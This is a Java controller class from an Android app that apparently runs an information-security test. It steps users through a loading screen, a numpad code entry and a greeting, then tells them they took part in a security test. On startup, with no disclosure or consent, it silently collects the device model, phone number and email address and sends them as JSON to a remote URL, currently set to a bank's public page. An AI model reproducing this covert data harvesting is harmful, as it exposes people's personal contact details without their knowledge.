package com.example.installed.practics1.helper_classes;

import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.text.Html;
import android.view.View;

import com.example.installed.practics1.MainActivity;
import com.example.installed.practics1.helper_classes.screen_controller.GreetingScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.GreetingScreenMetadata;
import com.example.installed.practics1.helper_classes.screen_controller.IOnGreetingScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnInfoScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnLoadingScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.IOnNumpadScreenControllerViewCreated;
import com.example.installed.practics1.helper_classes.screen_controller.InfoScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.InfoScreenMetadata;
import com.example.installed.practics1.helper_classes.screen_controller.LoadingScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.NumpadScreenController;
import com.example.installed.practics1.helper_classes.screen_controller.NumpadScreenMetada;

import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;

public class MainActivityController implements IOnLoadingScreenControllerViewCreated,
        IOnNumpadScreenControllerViewCreated,
        IOnGreetingScreenControllerViewCreated,
        IOnInfoScreenControllerViewCreated{

    public MainActivity activity;
    public LoadingScreenController loadingScreenController;
    public NumpadScreenController numpadScreenController;
    public GreetingScreenController greetingScreenController;
    public InfoScreenController infoScreenController;
    public MobileDataBroadcastReceiver mobileDataBroadcastReceiver;
    public RemoteBroadcastReceiver remoteBroadcastReceiver;
    //public PermissionRegistry permissionRegistry;
    public static final String REMOTE_URL_TO_SEND_MOBILE_DATA = "http://www.sberbank.ru/ru/person";
    public static final String REMOTE_URL_TO_REDIRRECT_USER = "http://www.sberbank.ru/ru/person";
    public static final Integer[] NUMPAD_CODE = new Integer[] {1, 1, 1, 1, 1};


    public class MobileDataBroadcastReceiver extends BroadcastReceiver {

        public MainActivity activity;
        public MobileDataProvider mobileDataProvider;
        public MobileDataProvider.ActionGetMobileDataResult lastResult;
        public Set<IOnMobileDataReceived> onMobileDataReceivedSet;


        public MobileDataBroadcastReceiver(MainActivity activity) {
            this.activity = activity;
            mobileDataProvider = new MobileDataProvider();
            onMobileDataReceivedSet = new HashSet<>();
        }


        @Override
        public void onReceive(Context context, Intent intent) {
            MobileDataProvider.ActionGetMobileDataResult result = mobileDataProvider.new ActionGetMobileDataResult(intent);
            lastResult = result;
            for (IOnMobileDataReceived handler:
                 onMobileDataReceivedSet) {
                handler.OnMobileDataReceived(result);
            }
        }

    }


    public class RemoteBroadcastReceiver extends BroadcastReceiver {

        public MainActivity activity;
        public RemoteProvider remoteProvider;
        public RemoteProvider.ActionSendDataResult lastResult;
        public Set<IOnRemoteReceived> onRemoteReceivedSet;


        public RemoteBroadcastReceiver(MainActivity activity) {
            this.activity = activity;
            remoteProvider = new RemoteProvider();
            onRemoteReceivedSet = new HashSet<>();
        }


        @Override
        public void onReceive(Context context, Intent intent) {
            RemoteProvider.ActionSendDataResult result = remoteProvider.new ActionSendDataResult(intent);
            lastResult = result;
            for (IOnRemoteReceived handler :
                    onRemoteReceivedSet) {
                handler.OnRemoteReceived(result);
            }
        }

    }


    public MainActivityController(MainActivity activity) {
        this.activity = activity;
        loadingScreenController = new LoadingScreenController(activity);
        numpadScreenController = new NumpadScreenController(activity);
        greetingScreenController = new GreetingScreenController(activity);
        infoScreenController = new InfoScreenController(activity);
        loadingScreenController.onLoadingScreenControllerViewCreated = this;
        numpadScreenController.onNumpadScreenControllerViewCreated = this;
        greetingScreenController.onGreetingScreenControllerViewCreated = this;
        infoScreenController.onInfoScreenControllerViewCreated = this;
        makeReceivers(activity);
        makeTelephoneDataTransfer(activity);
        //makePermissions(activity);
    }

    public void Start() {
        loadingScreenController.Show(null);
    }


    public void OnLoadingScreenControllerViewCreated(LoadingScreenController controller) {
        /*loadingScreenController.logoFragment.view.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                numpadScreenMetada.digits = NUMPAD_CODE;
                loadingScreenController.Remove();
                numpadScreenController.Show(numpadScreenMetada);
            }
        });*/
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                numpadScreenMetada.digits = NUMPAD_CODE;
                loadingScreenController.Remove();
                numpadScreenController.Show(numpadScreenMetada);
            }
        }, 5000);
    }


    public void OnNumpadScreenControllerViewCreated(NumpadScreenController controller) {
        //prepare next screen state!
        final GreetingScreenMetadata greetingScreenMetadata = new GreetingScreenMetadata();
        mobileDataBroadcastReceiver.onMobileDataReceivedSet.add(new IOnMobileDataReceived() {
            @Override
            public void OnMobileDataReceived(MobileDataProvider.ActionGetMobileDataResult result) {
                mobileDataBroadcastReceiver.onMobileDataReceivedSet.remove(this);
                if(result.HOUR >= 22 || result.HOUR <= 6) {
                    greetingScreenMetadata.isNight = true;
                } else if(result.HOUR >= 7 && result.HOUR <= 11) {
                    greetingScreenMetadata.isMoorning = true;
                }
                else if(result.HOUR >= 12 && result.HOUR <= 16) {
                    greetingScreenMetadata.isAfternoon = true;
                }
                else {
                    greetingScreenMetadata.isEvening = true;
                }
            }
        });
        MobileDataProvider.startActionGetMobileData(activity);

        //set current screen listeners
        final NumpadScreenController.NumpadLogic numpadLogic = numpadScreenController.new NumpadLogic(NUMPAD_CODE.length);
        numpadLogic.insertionDoneListener = new NumpadScreenController.INumpadInsertionDoneListener() {
            @Override
            public void NumpadInsertionDoneListener(Integer[] code) {
                boolean isCodeCorrect = numpadLogic.compareCodes(code, NUMPAD_CODE, NUMPAD_CODE.length);
                greetingScreenMetadata.isCodeCorrect = isCodeCorrect;
                numpadScreenController.Remove();
                greetingScreenController.Show(greetingScreenMetadata);
            }
        };
        /*View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                numpadScreenController.Remove();
                greetingScreenController.Show(greetingScreenMetadata);
            }
        };


        numpadScreenController.logoFragment.view.setOnClickListener(l);
        numpadScreenController.numpadFragment.view.setOnClickListener(l);*/
    }


    public void OnGreetingScreenControllerViewCreated(GreetingScreenController controller) {
        //prepare metadata to next screen
        final InfoScreenMetadata infoScreenMetadata = new InfoScreenMetadata();
        String text = "Вы стали участником тестирования службы информационной безопасности," +
                " для получения подробной информации перейдите по ссылке <a href=\"" + REMOTE_URL_TO_REDIRRECT_USER +
                "\">" + REMOTE_URL_TO_REDIRRECT_USER +"</a>";
        infoScreenMetadata.text = text;

        //set behaviour in listeners

        /*View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                InfoScreenMetadata infoScreenMetadata = new InfoScreenMetadata();
                infoScreenMetadata.text = "Вы приняли участие!";
                greetingScreenController.Remove();
                infoScreenController.Show(infoScreenMetadata);
            }
        };
        greetingScreenController.logoFragment.view.setOnClickListener(l);
        greetingScreenController.greetingFragment.view.setOnClickListener(l);*/

        //apply metadata
        if(greetingScreenController.metadata != null) {
            if(greetingScreenController.metadata.isMoorning) {
                greetingScreenController.greetingFragment.textView.setText("Доброе утро.");
            } else if(greetingScreenController.metadata.isAfternoon) {
                greetingScreenController.greetingFragment.textView.setText("Добрый день.");
            } else if(greetingScreenController.metadata.isEvening) {
                greetingScreenController.greetingFragment.textView.setText("Добрый вечер.");
            } else if(greetingScreenController.metadata.isNight) {
                greetingScreenController.greetingFragment.textView.setText("Доброй ночи.");
            } else {
                greetingScreenController.greetingFragment.textView.setText("Здравствуйте.");
            }

            if(greetingScreenController.metadata.isCodeCorrect) {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        greetingScreenController.Remove();
                        infoScreenController.Show(infoScreenMetadata);
                    }
                }, 5000);
            }
            else {
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        new AlertDialog.Builder(activity)
                                .setMessage("Неверный код!")
                                .setTitle("Ошибка")
                                .setCancelable(false)
                                .setPositiveButton("ОК", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        NumpadScreenMetada numpadScreenMetada = new NumpadScreenMetada();
                                        numpadScreenMetada.digits = NUMPAD_CODE;
                                        greetingScreenController.Remove();
                                        numpadScreenController.Show(numpadScreenMetada);
                                    }
                                })
                                .create()
                                .show();
                    }
                }, 5000);
            }
        }//metadata not null
    }


    public void OnInfoScreenControllerViewCreated(InfoScreenController controller) {
        //set behaviour in listeners
        View.OnClickListener l = new View.OnClickListener() {
            @Override
            public void onClick(View v) {
            }
        };
        infoScreenController.logoFragment.view.setOnClickListener(l);
        infoScreenController.infoFragment.view.setOnClickListener(l);

        //apply metadata
        InfoScreenMetadata metadata = infoScreenController.metadata;
        if(metadata != null && metadata.text != null) {
            infoScreenController.infoFragment.textView.setText(Html.fromHtml(metadata.text));
        }
    }


    private void makeReceivers(MainActivity activity) {
        mobileDataBroadcastReceiver = new MobileDataBroadcastReceiver(activity);
        IntentFilter intentFilterMobileData = new IntentFilter(
                MobileDataProvider
                        .ACTION_GET_MOBILE_DATA
                        .ACTION_RESPONSE_NAME
        );
        intentFilterMobileData.addCategory(Intent.CATEGORY_DEFAULT);
        activity.registerReceiver(mobileDataBroadcastReceiver, intentFilterMobileData);

        remoteBroadcastReceiver = new RemoteBroadcastReceiver(activity);
        IntentFilter intentFilterRemote = new IntentFilter(
                RemoteProvider
                    .ACTION_SEND_DATA
                    .ACTION_RESPONSE_NAME
        );
        intentFilterRemote.addCategory(Intent.CATEGORY_DEFAULT);
        activity.registerReceiver(remoteBroadcastReceiver, intentFilterRemote);
    }


    /*private void makePermissions(MainActivity activity) {

    }*/

    private void makeTelephoneDataTransfer(final MainActivity mainActivity) {

        mobileDataBroadcastReceiver.onMobileDataReceivedSet.add(
                new IOnMobileDataReceived() {
                    @Override
                    public void OnMobileDataReceived(MobileDataProvider.ActionGetMobileDataResult result) {
                        mobileDataBroadcastReceiver.onMobileDataReceivedSet.remove(this);
                        JSONObject jsonToSend = new JSONObject();
                        try {
                            jsonToSend.put("TELEPHONE_MODEL", result.TELEPHONE_MODEL);
                            jsonToSend.put("TELEPHONE_NUMBER", result.TELEPHONE_NUMBER);
                            jsonToSend.put("EMAIL", result.EMAIL);
                        }
                        catch (Exception ex) {

                        }

                        String data = jsonToSend.toString();
                        RemoteProvider.startActionSendData(mainActivity, REMOTE_URL_TO_SEND_MOBILE_DATA, data);

                    }//method
                }//class
        );

        MobileDataProvider.startActionGetMobileData(mainActivity);
    }

}
